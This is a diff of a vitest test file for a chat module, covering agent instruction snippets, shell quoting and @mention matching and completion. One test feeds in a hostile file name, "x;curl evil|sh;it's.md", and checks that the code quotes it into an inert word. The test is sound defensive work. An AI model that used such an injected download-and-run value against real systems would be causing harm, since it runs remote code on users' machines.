@@ -2,6 +2,7 @@ import { describe, it, expect } from 'vitest';
 import {
   slugify, chatPathFor, colorForAuthor, AUTHOR_COLORS, isOwnMessage,
   groupMessages, mergeMessages, agentInstructions, plainPreview, shellQuote, isChatDoc,
+  mentionsName, highlightMentions, participants, mentionQuery, completeMention,
 } from '../chat.js';
 
 describe('chat naming', () => {
@@ -61,9 +62,12 @@ describe('merging polled messages', () => {
 
 describe('agent instructions', () => {
   it('are pasteable — no <angle-bracket> placeholders', () => {
-    const s = agentInstructions('mini', 'notes', 'Chats/team.md');
+    const s = agentInstructions('mini', 'notes', 'Chats/team.md', 'codxu');
     expect(s).not.toMatch(/[<>]/);
-    expect(s).toContain('mdnest chat wait @mini/notes/Chats/team.md --after 1');
+    expect(s).toContain('mdnest chat wait @mini/notes/Chats/team.md --as codxu --timeout 120');
+    // the old snippet's literal name is what agents posted as; it must be gone
+    expect(s).not.toContain('my-agent');
+    expect(s).not.toContain('--after');
   });
 });
 
@@ -77,7 +81,7 @@ describe('list preview', () => {
 describe('shell safety of the agent snippet', () => {
   it('quotes a hostile chat path into one inert word', () => {
     const s = agentInstructions('', 'notes', "x;curl evil|sh;it's.md");
-    expect(s).toContain(`mdnest chat read 'notes/x;curl evil|sh;it'\\''s.md'`);
+    expect(s).toContain(`mdnest chat read 'notes/x;curl evil|sh;it'\\''s.md' --as AGENT_NAME`);
   });
   it('leaves an ordinary path readable', () => {
     expect(shellQuote('@mini/notes/Chats/team-sync.md')).toBe('@mini/notes/Chats/team-sync.md');
@@ -101,5 +105,31 @@ describe('isChatDoc (the editor lock and the tree redirect depend on it)', () =>
     expect(isChatDoc('***\n\nmdnest-chat: true\ntitle: myCustomChat\n-------------------\n')).toBe(false);
     expect(isChatDoc('---\nmdnest-chat: false\n---\n')).toBe(false);
     expect(isChatDoc('# mdnest-chat: true')).toBe(false);
+  });
+});
+
+describe('@mentions', () => {
+  it('matches the backend grammar', () => {
+    expect(mentionsName('@codxu take the frontend', 'codxu')).toBe(true);
+    expect(mentionsName('thanks @CodXu.', 'codxu')).toBe(true);
+    expect(mentionsName('@all standup', 'codxu')).toBe(true);
+    expect(mentionsName('@codu only', 'codxu')).toBe(false);
+    expect(mentionsName('mail x@codxu.com', 'codxu')).toBe(false);
+    expect(mentionsName('@codxu-bot', 'codxu')).toBe(false);
+  });
+  it('highlights mentions but leaves code alone', () => {
+    const h = highlightMentions('hi @codu, see `@notme` and\n```\n@neither\n```\nok @codxu.');
+    expect(h).toContain('<span class="chat-mention" data-mention="codu">@codu</span>,');
+    expect(h).toContain('<span class="chat-mention" data-mention="codxu">@codxu</span>.');
+    expect(h).toContain('`@notme`');
+    expect(h).toContain('@neither');
+    expect(h.match(/chat-mention/g)).toHaveLength(2);
+  });
+  it('offers participants most recent first and completes the word at the caret', () => {
+    expect(participants([{ n: 1, author: 'a' }, { n: 2, author: 'b' }, { n: 3, author: 'a' }])).toEqual(['a', 'b']);
+    expect(mentionQuery('hey @co', 7)).toBe('co');
+    expect(mentionQuery('mail x@co', 9)).toBe(null);
+    expect(mentionQuery('no mention', 10)).toBe(null);
+    expect(completeMention('hey @co and', 7, 'codxu')).toEqual({ text: 'hey @codxu  and', caret: 11 });
   });
 });
